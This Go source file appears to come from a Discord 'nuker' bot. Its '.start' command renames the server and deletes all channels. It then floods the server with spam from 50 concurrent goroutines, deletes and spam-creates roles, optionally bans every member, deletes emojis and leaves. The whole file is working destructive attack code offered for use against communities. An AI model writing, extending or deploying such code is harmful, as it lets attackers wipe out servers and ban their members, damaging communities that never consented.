package commands

import (
	"Dynamic/core/creating"
	"Dynamic/core/removing"
	"Dynamic/core/start_end"
	"fmt"
	"os"
	"strconv"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

func Start(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGroup) {
	godotenv.Load()
	MASS_BAN := os.Getenv("MASS_BAN")
	MASSBAN, _ := strconv.ParseBool(MASS_BAN)

	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.Content == ".start" {
		s.ChannelMessageDelete(m.ChannelID, m.ID)
		start_end.Logs(s, m)
		creating.GuildRename(s, m)

		wg.Add(1)
		go func() {
			defer wg.Done()
			channels, _ := s.GuildChannels(m.GuildID)
			creating.DeleteChannels(s, channels)
		}()
		wg.Wait()

		start_end.InviteCreate(s, m)

		for i := 0; i < 50; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				creating.TextSpam(s, m, wg)
			}()
		}
		wg.Wait()

		time.Sleep(2 * time.Second)

		wg.Add(1)
		go func() {
			defer wg.Done()
			creating.DeleteRoles(s, m)
		}()
		wg.Wait()

		time.Sleep(2 * time.Second)

		for i := 0; i < 40; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				creating.RolesSpam(s, m)
			}()
		}
		wg.Wait()

		time.Sleep(2 * time.Second)

		if MASSBAN {
			wg.Add(1)
			go func() {
				defer wg.Done()
				removing.MemberBan(s, m)
			}()
			wg.Wait()
		} else {
			fmt.Println("MASS_BAN not set or true, no mass ban initiated.")
		}

		time.Sleep(2 * time.Second)

		removing.EmojiDelete(s, m)

		start_end.Leave(s, m)
	}
}
